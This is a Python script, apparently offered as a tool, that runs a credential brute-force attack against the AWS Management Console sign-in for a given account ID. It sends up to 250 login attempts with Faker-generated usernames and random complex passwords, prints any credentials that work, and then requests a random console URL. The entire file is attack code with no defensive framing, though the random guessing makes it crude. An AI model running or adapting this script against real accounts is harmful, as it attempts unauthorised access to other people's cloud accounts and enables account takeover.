# This script includes a brute-force attack against the AWS Management Console.
# The script generates random usernames and passwords and attempts to login to the AWS Management Console.
# If the login is successful, the script prints the credentials and makes a random URL request to the AWS Management Console.
# The script uses the requests library to send HTTP requests and the tqdm library to display a progress bar. 
# The script also uses the Faker library to generate random names and usernames and the secrets library to generate random passwords.
# The script uses the argparse library to parse command-line arguments.
# The script uses the string library to generate random characters.
# The script uses the urllib3 library to disable warnings.
# The script uses the generate_typical_password function to generate a random password that contains at least one lowercase letter, one uppercase letter, one digit, and one special character.
# The script uses the generate_real_name function to generate a random name.
# The script uses the generate_random_username function to generate a random username.
# -----------------------

#!/usr/bin/python3
import argparse
import requests
import string
import urllib3
from tqdm import tqdm
from faker import Faker
import secrets

# Disable urllib3 warnings
urllib3.disable_warnings()

headers = {
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'referer': 'https://console.aws.amazon.com/console/home?state=hashArgs%23&isauthcode=truehttps://console.aws.amazon.com/console/home?state=hashArgs%23&isauthcode=true',
}

base_url = 'https://console.aws.amazon.com/'

parser = argparse.ArgumentParser()
parser.add_argument('--account-id', '-id', required=True, metavar='account_id', type=str, help='AWS Account ID')
parser.add_argument('--random-user', '-ru', action='store_true', help='Generate a random username')
args = parser.parse_args()

def generate_typical_password(length=12):
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(secrets.choice(alphabet) for i in range(length))
    while not (any(c.islower() for c in password) and
               any(c.isupper() for c in password) and
               any(c.isdigit() for c in password) and
               any(c in string.punctuation for c in password)):
        password = ''.join(secrets.choice(alphabet) for i in range(length))
    return password

def generate_real_name():
    fake = Faker()
    return fake.name()

def generate_random_username():
    fake = Faker()
    return fake.user_name()

def attempt_login(username, password):
    data = {
        'action': 'iam-user-authentication',
        'account': args.account_id,
        'username': username,
        'password': password,
        'client_id': 'arn:aws:signin:::console/canvas',
        'redirect_uri': 'https://console.aws.amazon.com/console/home',
    }
    response = requests.post(
        'https://signin.aws.amazon.com/authenticate',
        headers=headers,
        data=data,
        verify=True  # Enable certificate verification
    )
    if '"result":"SUCCESS"' in response.text:
        print("="*20)
        print("Login successful with the following credentials:")
        print("Username:", username)
        print("Password:", password)
        return True
    else:
        print("="*20)
        print("Login failed with the following credentials:")
        print("Username:", username)
        print("Password:", password)
        return False

def generate_random_path(length=10):
    characters = string.ascii_letters + string.digits + '-_/'
    return ''.join(secrets.choice(characters) for _ in range(length))

def make_random_url_request():
    path = generate_random_path()
    url = base_url + path
    response = requests.get(url)
    print("="*20)
    print(f"Requested URL: {url}")
    print(f"Response status code: {response.status_code}")
    print(f"Response content:\n{response.text}")

if __name__ == '__main__':
    success = False
    progress_bar = tqdm(total=250, desc="Attempts", unit="attempt")
    for _ in range(250):
        progress_bar.update(1)
        if args.random_user:
            username = generate_random_username()
        else:
            username = generate_real_name()
        
        password = generate_typical_password()
        
        if attempt_login(username, password):
            progress_bar.close()
            success = True
            break
    else:
        progress_bar.close()
        print("Login unsuccessful after 250 attempts.")
    
    if success:
        make_random_url_request()
